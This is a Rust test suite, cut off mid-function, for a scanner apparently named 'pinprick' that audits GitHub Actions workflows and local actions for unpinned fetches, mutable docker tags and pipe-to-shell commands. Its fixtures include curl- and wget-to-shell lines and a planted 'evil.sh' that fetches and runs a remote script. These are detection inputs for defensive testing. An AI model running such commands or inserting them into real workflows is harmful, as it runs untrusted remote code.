// ── Missing workflows directory ─────────────────────────────────────────────

#[test]
fn missing_workflows_dir_exits_two() {
    let dir = tempfile::TempDir::new().unwrap();
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .code(2)
        .stderr(predicate::str::contains("No workflow directory found"));
}

#[test]
fn missing_workflows_dir_json() {
    let dir = tempfile::TempDir::new().unwrap();
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(2));
    let json: serde_json::Value = serde_json::from_slice(&output.stderr).unwrap();
    assert!(
        json["error"]
            .as_str()
            .unwrap()
            .contains("No workflow directory found")
    );
}

// ── Token status ────────────────────────────────────────────────────────────

#[test]
fn no_token_json_had_token_false() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["had_token"], false);
}

// ── SARIF output ────────────────────────────────────────────────────────────

#[test]
fn sarif_valid_structure() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg("--sarif")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    assert!(
        json["$schema"]
            .as_str()
            .unwrap()
            .contains("sarif-schema-2.1.0")
    );
    assert_eq!(json["version"], "2.1.0");

    let runs = json["runs"].as_array().unwrap();
    assert_eq!(runs.len(), 1);
    assert_eq!(runs[0]["tool"]["driver"]["name"], "pinprick");

    let rules = runs[0]["tool"]["driver"]["rules"].as_array().unwrap();
    assert!(!rules.is_empty());
    for rule in rules {
        assert!(rule["id"].is_string());
        assert!(rule["name"].is_string());
        assert!(rule["shortDescription"]["text"].is_string());
        assert!(rule["fullDescription"]["text"].is_string());
    }
}

#[test]
fn sarif_findings_mapped() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PIPE_TO_SHELL);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg("--sarif")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    let results = json["runs"][0]["results"].as_array().unwrap();
    assert!(!results.is_empty());
    for result in results {
        assert!(result["ruleId"].is_string());
        assert!(result["level"].is_string());
        assert!(result["message"]["text"].is_string());
        assert!(result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"].is_string());
        assert!(result["locations"][0]["physicalLocation"]["region"]["startLine"].is_number());
    }
}

#[test]
fn sarif_no_findings() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg("--sarif")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let results = json["runs"][0]["results"].as_array().unwrap();
    assert!(results.is_empty());
}

#[test]
fn sarif_conflicts_with_json() {
    // Enforced at dispatch — clap's conflicts_with can't reach the global
    // --json on the parent command.
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg("--sarif")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(2));
    let json: serde_json::Value = serde_json::from_slice(&output.stderr).unwrap();
    assert!(json["error"].as_str().unwrap().contains("--sarif"));
}

// ── Verbose output ──────────────────────────────────────────────────────────

#[test]
fn verbose_shows_allowed() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_VERSIONED);
    common::pinprick_cmd()
        .arg("audit")
        .arg("--verbose")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("OK"));
}

#[test]
fn verbose_json_includes_allowed() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_VERSIONED);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg("--verbose")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let allowed = json["allowed"].as_array().unwrap();
    assert!(
        !allowed.is_empty(),
        "expected allowed matches for versioned URL"
    );
}

// ── Config integration ──────────────────────────────────────────────────────

#[test]
fn config_severity_high_filters_lower() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_MULTI_FINDINGS,
        "severity = \"high\"\n",
    );

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.iter().all(|f| f["severity"] == "high"),
        "expected only high findings when severity=high"
    );
}

#[test]
fn config_ignore_patterns() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_PIPE_TO_SHELL,
        "[ignore]\npatterns = [\"piped to shell\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.is_empty(),
        "expected finding to be suppressed by ignore.patterns"
    );
}

#[test]
fn empty_config_ignore_pattern_does_not_suppress() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_PIPE_TO_SHELL,
        "[ignore]\npatterns = [\"\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["findings"].as_array().unwrap().len(), 1);
}

#[test]
fn repo_config_suppression_prints_notice() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_PIPE_TO_SHELL,
        "[ignore]\npatterns = [\"piped to shell\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("note: the scanned repo's .pinprick.toml affected results"),
        "expected a repo-config notice on stderr, got: {stderr}"
    );
    assert!(stderr.contains("findings suppressed: 1"));
    assert!(stderr.contains("--no-repo-config"));
}

#[test]
fn no_repo_config_ignores_local_file() {
    // Same suppressing config, but --no-repo-config must restore the finding
    // (exit 1) and print no notice.
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_PIPE_TO_SHELL,
        "[ignore]\npatterns = [\"piped to shell\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .arg("--no-repo-config")
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.contains("note: the scanned repo's .pinprick.toml"));
}

#[test]
fn repo_config_parse_error_redacts_source_excerpt() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_CLEAN,
        "trusted-hosts = [\"secret.internal.example\"\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("warning: failed to parse"));
    assert!(stderr.contains("using defaults"));
    assert!(!stderr.contains("secret.internal.example"));
    assert!(!stderr.contains("TOML parse error"));
}

#[test]
fn repo_config_trusted_host_notice_without_verbose() {
    // The trusted-host count must not depend on --verbose.
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_TRUSTED_HOST,
        "trusted-hosts = [\"artifacts.internal.example.com\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("trusted-host fetches: 1"),
        "expected a trusted-host notice on stderr, got: {stderr}"
    );
}

#[test]
fn repo_config_non_literal_extra_data_format_prints_notice() {
    let workflow = "\
name: non-literal
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL \"$RELEASE_URL\" -o tool.bin
";
    let dir = common::repo_with_config("ci.yml", workflow, "extra-data-formats = [\"bin\"]\n");

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("extra-data-format fetches: 1"),
        "expected a repo-config notice on stderr, got: {stderr}"
    );
    assert!(stderr.contains("--no-repo-config"));
}

#[test]
fn repo_config_clean_repo_prints_no_notice() {
    // A repo-local config that changes nothing must stay silent.
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_CLEAN,
        "[ignore]\npatterns = [\"piped to shell\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.contains("note:"));
}

#[test]
fn config_trusted_hosts() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_TRUSTED_HOST,
        "trusted-hosts = [\"artifacts.internal.example.com\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.is_empty(),
        "expected trusted host to suppress finding"
    );
}

#[test]
fn config_extra_data_formats() {
    let workflow = "\
name: proto
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - run: curl -L https://example.com/schema.proto -o schema.proto
";
    let dir = common::repo_with_config("ci.yml", workflow, "extra-data-formats = [\"proto\"]\n");

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.is_empty(),
        "expected .proto to be exempt via extra-data-formats"
    );
}

// ── git clone ─────────────────────────────────────────────────────────────

#[test]
fn git_clone_unpinned_finding() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_GIT_CLONE);

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "medium");
    assert!(
        findings[0]["description"]
            .as_str()
            .unwrap()
            .contains("git clone")
    );
}

#[test]
fn git_clone_versioned_branch_clean() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_GIT_CLONE_VERSIONED);

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(findings.is_empty());
}

// ── docker:// container refs ────────────────────────────────────────────────

#[test]
fn docker_uses_latest_and_tag_are_findings_digest_is_allowed() {
    let workflow = "\
name: docker
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: docker://alpine:latest
      - uses: docker://alpine
      - uses: docker://alpine:3.20
      - uses: docker://ghcr.io/org/tool@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg("--verbose")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 3);
    // Sorted high before medium.
    assert_eq!(findings[0]["severity"], "high");
    assert_eq!(findings[0]["category"], "docker_unpinned");
    assert_eq!(findings[0]["action"], "docker://alpine:latest");
    assert_eq!(findings[0]["line"], 7);
    assert_eq!(findings[1]["severity"], "high");
    assert_eq!(findings[1]["action"], "docker://alpine");
    assert_eq!(findings[2]["severity"], "medium");
    assert_eq!(findings[2]["action"], "docker://alpine:3.20");
    assert!(
        findings[2]["description"]
            .as_str()
            .unwrap()
            .contains("mutable tag")
    );

    // The digest-pinned image is visible as an allowed match under --verbose.
    let allowed = json["allowed"].as_array().unwrap();
    assert!(allowed.iter().any(|entry| {
        entry["reason"] == "digest-pinned image"
            && entry["action"]
                .as_str()
                .unwrap()
                .starts_with("docker://ghcr.io/org/tool@sha256:")
    }));
}

#[test]
fn docker_uses_digest_pinned_exits_zero() {
    let workflow = "\
name: docker
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: docker://alpine:3.20@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      - run: echo ok
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success();
}

#[test]
fn docker_uses_inside_run_block_is_not_a_finding() {
    let workflow = "\
name: docker
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo 'uses: docker://alpine:latest'
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success();
}
#[test]
fn no_token_reports_external_actions_skipped() {
    let workflow = "\
name: two-actions
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - uses: actions/setup-node@v4
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(2));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["had_token"], false);
    assert_eq!(json["actions_scanned"], 1);
    assert_eq!(json["coverage_complete"], false);
    // The pinned checkout is covered by the bundled catalog. Only setup-node
    // lacks source coverage without a token.
    assert_eq!(json["external_actions_skipped"], 1);
}

#[test]
fn no_token_human_note_distinguishes_catalog_coverage() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .code(0)
        .stdout(predicate::str::contains("Audited 1 action: 1 bundled"))
        .stdout(predicate::str::contains(
            "no GitHub token — action source code was not scanned",
        ));
}

/// A local action that ships an unrelated `Dockerfile` (an example image, a CI
/// image, a leftover) must not be audited as if a consumer built it: the
/// action is a Node action and `runs` never names the file.
#[test]
fn node_action_with_unrelated_dockerfile_is_clean() {
    let dir = common::repo_with_workflow(
        "ci.yml",
        "\
name: local
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/mine
",
    );
    let action = dir.path().join(".github/actions/mine");
    std::fs::create_dir_all(action.join("dist")).unwrap();
    std::fs::write(
        action.join("action.yml"),
        "name: mine\ndescription: node action\nruns:\n  using: node20\n  main: dist/index.js\n",
    )
    .unwrap();
    std::fs::write(action.join("dist/index.js"), "console.log('hi');\n").unwrap();
    std::fs::write(action.join("Dockerfile"), "FROM alpine\nRUN echo hi\n").unwrap();

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(json["findings"].as_array().unwrap().is_empty());
}

/// The counterpart: when the action really is a container action, the
/// Dockerfile its `runs.image` names is still scanned.
#[test]
fn docker_action_dockerfile_named_by_runs_image_is_scanned() {
    let dir = common::repo_with_workflow(
        "ci.yml",
        "\
name: local
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/mine
",
    );
    let action = dir.path().join(".github/actions/mine");
    std::fs::create_dir_all(&action).unwrap();
    std::fs::write(
        action.join("action.yml"),
        "name: mine\ndescription: container action\nruns:\n  using: docker\n  image: Dockerfile\n",
    )
    .unwrap();
    std::fs::write(action.join("Dockerfile"), "FROM alpine\nRUN echo hi\n").unwrap();

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["category"], "docker_unpinned");
}

const CURL_BASH: &str = "curl -fsSL https://example.com/install.sh | bash\n";
const PYTHON_CURL_BASH: &str = "import subprocess\nsubprocess.run('curl -fsSL https://example.com/install.sh | bash', shell=True)\n";

fn composite_action(shell: &str, run: &str, env: Option<(&str, &str)>) -> String {
    let mut step = serde_json::json!({ "shell": shell, "run": run });
    if let Some((name, value)) = env {
        step["env"] = serde_json::json!({ name: value });
    }
    serde_json::json!({
        "name": "local",
        "description": "local",
        "runs": { "using": "composite", "steps": [step] }
    })
    .to_string()
}

fn node_action(main: &str) -> String {
    serde_json::json!({
        "name": "local",
        "description": "local",
        "runs": { "using": "node20", "main": main }
    })
    .to_string()
}

fn audit_local_action(action: &str, files: &[(&str, &str)]) -> (Option<i32>, serde_json::Value) {
    let dir = common::repo_with_local_action(action, files);
    let output = common::pinprick_cmd()
        .args(["--json", "audit"])
        .arg(dir.path())
        .output()
        .unwrap();
    (
        output.status.code(),
        serde_json::from_slice(&output.stdout).unwrap(),
    )
}

#[test]
fn dynamic_program_operands_expose_nested_script_findings() {
    let prelude = "const { execFileSync } = require('child_process');\nconst path = require('path');\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
    for execution in [
        "execFileSync(which('bash'), [path.join(__dirname, 'x.sh')]);",
        "const { exec } = require('./exec.js'); exec(`\"${which('bash')}\"`, [path.join(__dirname, 'x.sh')]);",
        "execFileSync('bash', [path.join(__dirname, 'run.sh'), which('bash')]);",
    ] {
        let source = format!("{prelude}{execution}\n");
        let dir = common::repo_with_local_action(
            &node_action("index.js"),
            &[
                ("index.js", &source),
                (
                    "exec.js",
                    "const cp = require('child_process'); exports.exec = (line, args) => cp.spawnSync(line, args);\n",
                ),
                ("run.sh", "SH=\"$1\"\n\"$SH\" \"$(dirname \"$0\")/x.sh\"\n"),
                (
                    "x.sh",
                    "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
                ),
            ],
        );
        let output = common::pinprick_cmd()
            .args(["audit", "--no-audited-catalog", "--json"])
            .arg(dir.path())
            .output()
            .unwrap();
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(output.status.code(), Some(1), "{execution}: {report}");
        assert_eq!(report["coverage_complete"], true, "{execution}: {report}");
        assert!(
            report["findings"]
                .as_array()
                .unwrap()
                .iter()
                .any(|finding| {
                    finding["category"] == "shell_fetch"
                        && finding["description"]
                            .as_str()
                            .unwrap()
                            .contains("piped to shell")
                        && finding["source_file"] == "./act (x.sh)"
                }),
            "{execution}: {report}"
        );
    }
}

#[test]
fn dynamic_program_operands_follow_composite_scripts() {
    let dir = common::repo_with_local_action(
        &composite_action("bash", "\"$SOME_TOOL\" \"$GITHUB_ACTION_PATH/x.sh\"", None),
        &[(
            "x.sh",
            "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
        )],
    );
    let output = common::pinprick_cmd()
        .args(["audit", "--no-audited-catalog", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(output.status.code(), Some(1), "{report}");
    assert_eq!(report["coverage_complete"], true, "{report}");
}

#[test]
fn dynamic_program_operands_composite_directories_fail_closed() {
    for run in [
        "\"$PYTHON\" -m pip install \"$GITHUB_ACTION_PATH\"",
        "\"$SOME_TOOL\" --prefix \"$GITHUB_ACTION_PATH\"",
    ] {
        let dir = common::repo_with_local_action(
            &composite_action("bash", run, None),
            &[(
                "pyproject.toml",
                "[project]\nname = 'test'\nversion = '1.0.0'\n",
            )],
        );
        let output = common::pinprick_cmd()
            .args(["audit", "--no-audited-catalog", "--json"])
            .arg(dir.path())
            .output()
            .unwrap();
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(output.status.code(), Some(2), "{run}: {report}");
        assert_eq!(report["coverage_complete"], false, "{run}: {report}");
    }
}

#[test]
fn dynamic_program_operands_container_commands() {
    for (file, source, command, code, complete) in [
        (
            "tool",
            "#!/bin/sh\necho hi\n",
            "ENTRYPOINT $RUNNER /app/tool",
            2,
            false,
        ),
        (
            "x.sh",
            "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
            "RUN \"$TOOL\" /app/x.sh",
            1,
            true,
        ),
        (
            "tool",
            "#!/bin/sh\necho hi\n",
            "ENTRYPOINT tar -xf /app/tool",
            0,
            true,
        ),
    ] {
        let dockerfile = format!(
            "FROM alpine:3.20@sha256:{}\nCOPY {file} /app/{file}\n{command}\n",
            "0".repeat(64)
        );
        let dir = common::repo_with_local_action(
            "name: test\ndescription: test\nruns:\n  using: docker\n  image: Dockerfile\n",
            &[("Dockerfile", &dockerfile), (file, source)],
        );
        let output = common::pinprick_cmd()
            .args(["audit", "--no-audited-catalog", "--json"])
            .arg(dir.path())
            .output()
            .unwrap();
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(output.status.code(), Some(code), "{command}: {report}");
        assert_eq!(report["coverage_complete"], complete, "{command}: {report}");
        if code == 1 {
            assert!(
                report["findings"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .any(|finding| {
                        finding["category"] == "shell_fetch"
                            && finding["description"]
                                .as_str()
                                .unwrap()
                                .contains("piped to shell")
                            && finding["source_file"] == "./act (x.sh)"
                    }),
                "{command}: {report}"
            );
        }
    }
}

#[test]
fn dynamic_program_operands_python_env_argv_follows_script() {
    let dir = common::repo_with_local_action(
        &composite_action("bash", "python3 \"$GITHUB_ACTION_PATH/run.py\"", None),
        &[
            (
                "run.py",
                "import os, shutil, subprocess\nscript = os.path.join(os.path.dirname(__file__), 'x.sh')\nsubprocess.run(['env', shutil.which('bash'), script])\n",
            ),
            (
                "x.sh",
                "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
            ),
        ],
    );
    let output = common::pinprick_cmd()
        .args(["audit", "--no-audited-catalog", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(output.status.code(), Some(1), "{report}");
    assert_eq!(report["coverage_complete"], true, "{report}");
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["category"] == "shell_fetch"
                    && finding["description"]
                        .as_str()
                        .unwrap()
                        .contains("piped to shell")
                    && finding["source_file"] == "./act (x.sh)"
            }),
        "{report}"
    );
}

#[test]
fn dynamic_program_operands_python_stays_fail_closed() {
    for argv in [
        "shutil.which('bash'), os.path.join(os.path.dirname(__file__), 'x.sh')",
        "shutil.which('tool'), os.path.join(os.path.dirname(__file__), 'config.json')",
        "shutil.which('bash'), os.path.join(os.path.dirname(__file__), sys.argv[1])",
        "shutil.which('pwsh'), '-Command', '& ' + os.path.join(os.path.dirname(__file__), 'x.ps1')",
        "'bash', os.path.join(os.path.dirname(__file__), sys.argv[1])",
    ] {
        let source = format!("import os, shutil, subprocess, sys\nsubprocess.run([{argv}])\n");
        let dir = common::repo_with_local_action(
            &composite_action("bash", "python3 \"${{ github.action_path }}/run.py\"", None),
            &[
                ("run.py", &source),
                (
                    "x.sh",
                    "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
                ),
                ("config.json", "{}\n"),
                ("x.ps1", "Write-Output 'ok'\n"),
            ],
        );
        let output = common::pinprick_cmd()
            .args(["audit", "--no-audited-catalog", "--json"])
            .arg(dir.path())
            .output()
            .unwrap();
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(output.status.code(), Some(2), "{argv}: {report}");
        assert_eq!(report["coverage_complete"], false, "{argv}: {report}");
    }
}

#[test]
fn dynamic_program_operands_tool_cache_embedded_command_stays_complete() {
    let dir = common::repo_with_local_action(
        &node_action("index.js"),
        &[
            (
                "index.js",
                r#"const path30 = require('path');
const { exec } = require('./exec');
function which(tool) { return process.env.TOOLS + '/' + tool; }
async function extract7z(file, dest) {
  const escapedScript = path30.join(__dirname, '..', 'scripts', 'Invoke-7zdec.ps1').replace(/'/g, "''").replace(/"|\n|\r/g, '');
  const command = `& '${escapedScript}' -Source '${file}' -Target '${dest}'`;
  const args = ['-NoLogo', '-Sta', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Unrestricted', '-Command', command];
  await exec(`"${which('powershell')}"`, args, { silent: true });
}
module.exports = extract7z;
"#,
            ),
            (
                "exec.js",
                "const cp = require('child_process'); exports.exec = (line, args) => cp.spawnSync(line, args);\n",
            ),
        ],
    );
    let output = common::pinprick_cmd()
        .args(["audit", "--no-audited-catalog", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(output.status.code(), Some(0), "{report}");
    assert_eq!(report["coverage_complete"], true, "{report}");
}

#[test]
fn exported_function_parameters_are_not_bound_to_local_calls() {
    let prelude = "import cp from 'child_process';\nimport path from 'path';\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
    let local_call = "run(path.join(import.meta.dirname, 'x.sh'));\n";
    let importer = "import { run } from './lib.js';\nimport path from 'path';\nrun(path.join(import.meta.dirname, 'evil.sh'));\n";
    let failures: Vec<String> = [
        (
            "function declaration",
            "export function run(script) { return cp.spawnSync(which('bash'), [script]); }\n",
            importer,
            (Some(2), false),
        ),
        (
            "function expression",
            "export const run = function (script) { return cp.spawnSync(which('bash'), [script]); };\n",
            importer,
            (Some(2), false),
        ),
        (
            "arrow function",
            "export const run = (script) => cp.spawnSync(which('bash'), [script]);\n",
            importer,
            (Some(2), false),
        ),
        (
            "default export",
            "export default function run(script) { return cp.spawnSync(which('bash'), [script]); }\n",
            "import run from './lib.js';\nimport path from 'path';\nrun(path.join(import.meta.dirname, 'evil.sh'));\n",
            (Some(2), false),
        ),
        (
            "export specifier",
            "function run(script) { return cp.spawnSync(which('bash'), [script]); }\nexport { run };\n",
            importer,
            (Some(2), false),
        ),
        (
            "unexported function",
            "function run(script) { return cp.spawnSync(which('bash'), [script]); }\n",
            "import './lib.js';\n",
            (Some(1), true),
        ),
    ]
    .iter()
    .filter_map(|(name, definition, main, expected)| {
        let lib = format!("{prelude}{definition}{local_call}");
        let dir = common::repo_with_local_action(
            &node_action("index.js"),
            &[
                ("package.json", "{ \"type\": \"module\" }\n"),
                ("index.js", main),
                ("lib.js", &lib),
                ("x.sh", CURL_BASH),
                ("evil.sh", "wget -qO- https://example.com/evil.sh | sh\n"),
            ],
        );
        let output = common::pinprick_cmd()
            .args(["audit", "--no-audited-catalog", "--json"])
            .arg(dir.path())
            .output()
            .unwrap();
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        let result = (
            output.status.code(),
            report["coverage_complete"].as_bool().unwrap(),
        );
        (result != *expected).then(|| format!("{name}: {result:?} {report}"))
    })
    .collect();
    assert!(failures.is_empty(), "{failures:#?}");
}

const MODULE_CJS: &str = "const cp = require('child_process');\nconst fs = require('fs');\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
const MODULE_ESM: &str = "import cp from 'child_process';\nimport fs from 'fs';\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
const MODULE_RUN: &str = "(script) => cp.spawnSync(which('bash'), [script])";
const CALLER_CJS: &str = "const path = require('path');\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
const CALLER_ESM: &str = "import path from 'path';\n";

#[derive(Debug, PartialEq)]
enum ModuleOutcome {
    /// The planted script is scanned and the scan stays complete.
    Followed,
    Incomplete,
    Clean,
}

/// Audits an action whose `index.js` loads the action's other `files`, with
/// `evil.sh` planted beside it.
fn audit_modules(esm: bool, files: &[(&str, String)]) -> ModuleOutcome {
    let package = if esm {
        "{ \"type\": \"module\" }\n"
    } else {
        "{}\n"
    };
    let mut all: Vec<(&str, &str)> = files
        .iter()
        .map(|(path, content)| (*path, content.as_str()))
        .collect();
    all.extend([
        ("package.json", package),
        ("evil.sh", "wget -qO- https://example.com/evil.sh | sh\n"),
        ("config.json", "{}\n"),
    ]);
    let dir = common::repo_with_local_action(&node_action("index.js"), &all);
    let output = common::pinprick_cmd()
        .args(["audit", "--no-audited-catalog", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
